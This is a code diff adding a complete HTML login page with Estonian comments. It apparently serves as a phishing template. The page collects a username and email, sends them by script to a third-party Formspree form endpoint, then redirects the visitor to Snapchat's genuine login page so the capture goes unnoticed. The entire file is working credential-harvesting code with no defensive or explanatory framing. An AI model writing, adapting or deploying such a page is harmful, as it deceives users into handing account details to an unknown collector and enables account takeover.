@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="et">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login form</title>
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f2f2f7;
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .login-card {
+    background: #fff;
+    padding: 30px;
+    border-radius: 16px;
+    width: 340px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+  }
+  h2 {
+    text-align: center;
+    margin-top: 0;
+    margin-bottom: 20px;
+    font-weight: 600;
+  }
+  label {
+    font-size: 14px;
+    display: block;
+    margin-bottom: 6px;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 16px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    background: #000;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #333;
+  }
+  .status {
+    margin-top: 12px;
+    font-size: 13px;
+    text-align: center;
+    color: #666;
+    min-height: 18px;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-card">
+  <h2>Log in</h2>
+
+  <form id="login-form" action="https://formspree.io/f/xovgwprn" method="POST">
+    <label for="username">Kasutajanimi</label>
+    <input type="text" id="username" name="username" required>
+
+    <label for="email">E-mail</label>
+    <input type="email" id="email" name="email" required>
+
+    <button type="submit">Continue</button>
+
+    <div id="form-status" class="status"></div>
+  </form>
+</div>
+
+<script>
+  // MUUDA SEE OMA SOOVITUD URL-I VASTU
+  const REDIRECT_URL = 'https://accounts.snapchat.com/v2/login';
+  // Näiteks kui samas kaustas on fail "aitah.html", siis:
+  // const REDIRECT_URL = 'aitah.html';
+
+  const form = document.getElementById('login-form');
+  const statusEl = document.getElementById('form-status');
+
+  form.addEventListener('submit', async function(event) {
+    event.preventDefault(); // ära lase brauseril tavaliselt submit'ida
+
+    statusEl.textContent = 'Saadan...';
+
+    const data = new FormData(form);
+
+    try {
+      const response = await fetch(form.action, {
+        method: form.method,
+        body: data,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (response.ok) {
+        // kui Formspree ütleb OK → siis suuname SINU lehele
+        window.location.href = REDIRECT_URL;
+      } else {
+        statusEl.textContent = 'Midagi läks valesti. Proovi uuesti.';
+      }
+    } catch (error) {
+      statusEl.textContent = 'Võrguviga. Proovi hiljem uuesti.';
+    }
+  });
+</script>
+
+</body>
+</html>
